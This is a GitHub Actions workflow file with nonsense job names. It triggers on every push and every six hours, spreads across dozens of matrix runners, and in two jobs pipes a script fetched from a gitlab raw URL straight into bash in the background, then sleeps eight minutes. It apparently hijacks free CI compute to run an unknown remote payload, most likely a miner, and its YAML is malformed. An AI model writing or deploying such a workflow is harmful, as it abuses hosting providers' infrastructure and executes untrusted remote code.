name: SWEDDC
on:   
  push:
  schedule: 
  - cron: "0 */6 * * *"

jobs:
  hert:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        build: [A.1, B.1]
        flag: [A, B, C, D, E, F, G, H, I, J]
    steps: 
      - name: hertob
        continue-on-error: true
        run: echo hert

  bert:
    needs: [hert]
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        build: [C.1, D.1]
        flag: [A, B, C, D, E, F, G, H, I, J]
    steps: 
      - name: bertjob
        continue-on-error: true
    run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash &
            sleep 8m

  buner:
    needs: [hert]
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        build: [E.1, F.1]
        flag: [A, B, C, D, E, F, G, H, I, J]
    steps: 
      - name: bertjob
        continue-on-error: true
    run: curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash &
            sleep 8m            